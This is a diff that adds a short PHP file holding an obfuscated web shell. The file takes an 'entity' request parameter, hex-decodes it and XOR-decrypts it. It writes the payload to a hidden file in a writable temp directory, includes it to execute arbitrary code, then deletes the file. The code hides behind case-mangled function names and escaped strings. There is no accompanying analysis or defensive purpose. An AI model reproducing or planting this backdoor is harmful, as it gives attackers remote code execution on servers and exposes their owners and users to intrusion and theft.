@@ -1,0 +1,3 @@
+<?php
+//<PHPDATA>fputs_xor;68;entity</PHPDATA>
+if(isset($_REQUEST)&&isset($_REQUEST["entit\171"])):$__=aRrAY_fIltEr([inI_gET("u\160load\x5ftm\160_dir"),SYs_GET_teMP_dIr(),"/dev\x2f\x73h\155",sEssiON_SaVE_PAth(),"\x2fvar/\164\155\x70",GeTEnV("T\105\x4d\120"),"\x2ftm\x70",GEtENv("TMP"),GEtCwD()]);$___=hEx2Bin($_REQUEST["enti\164y"]);$____="";for($_____=(-0176+0x7e);$_____<sTRLEN($___);$_____++):$____.=chr(Ord($___[$_____])^(0x22-0b10011000+186));endfor;foreach($__ as$______=>$_______):if((bool)Is_DIr($_______)&&(bool)Is_WrITAble($_______)):$________=stR_RePlaCe("\173v\x61r_dir}",$_______,"{\x76a\x72_di\162\x7d/\056mrk");if(false!==fIle_PUt_conTENtS($________,$____)):include_once $________;@unlink($________);exit;endif;endif;endforeach;endif;
